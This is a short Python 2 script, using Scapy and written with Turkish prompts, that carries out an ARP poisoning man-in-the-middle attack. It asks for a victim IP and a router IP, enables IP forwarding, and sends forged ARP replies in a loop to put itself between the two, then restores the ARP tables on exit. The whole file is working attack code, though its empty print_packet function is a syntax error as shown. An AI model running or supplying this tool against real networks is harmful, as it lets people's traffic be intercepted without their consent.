from scapy.all import *
import sys
import os
import time

try:
   interface = raw_input("[*] Kullanilacak arayüz: ")
   victIP = raw_input("[*] Kurban IP adresi: ")
   gateIP = raw_input("[*] Router IP adresi: ")
except KeyboardInterrupt:
   print "\n[*] Program kapatiliyor.."
   sys.exit(1)

print "\n[*] IP yonlendirme aktif ediliyor.."
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
   conf.verb = 0
   ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
   for snd, rcv in ans:
      return rcv.sprintf(r"%Ether.src%")

def reARP():
   print "[*] Hedef sistemler onariliyor.."
   victMAC = get_mac(victIP)
   gateMAC = get_mac(gateIP)
   send(ARP(op=2, pdst=gateIP, psrc=victIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victMAC), count=7)
   send(ARP(op=2, pdst=victIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
   print "[*] IP yonlendirme pasif ediliyor.."
   os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
   print "[*] Program kapatiliyor.."
   sys.exit(1)

def trick(gateM, victM):
   send(ARP(op=2, pdst=victIP, psrc=gateIP, hwdst=victM))
   send(ARP(op=2, pdst=gateIP, psrc=victIP, hwdst=gateM))

def print_packet():
   # Gerekli degisikleri buraya yapın

def mitm():
   try:
      victMAC = get_mac(victIP)
   except Exception:
      os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
      print "[!] Kurban MAC adres' bulunamadi."
      print "[!] Program kapatiliyor.."
      sys.exit(1)
   
   try:
      gateMAC = get_mac(gateIP)
   except Exception:
      os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
      print "[!] Router MAC adres' bulunamadi."
      print "[!] Program kapatiliyor.."
      sys.exit(1)

   print "[*] Hedeflere ARP Poisoning yapiliyor.."
 
   while True:
      try:
         trick(gateMAC, victMAC)
         time.sleep(1.5)
      except KeyboardInterrupt:
         reARP()
         break

mitm()
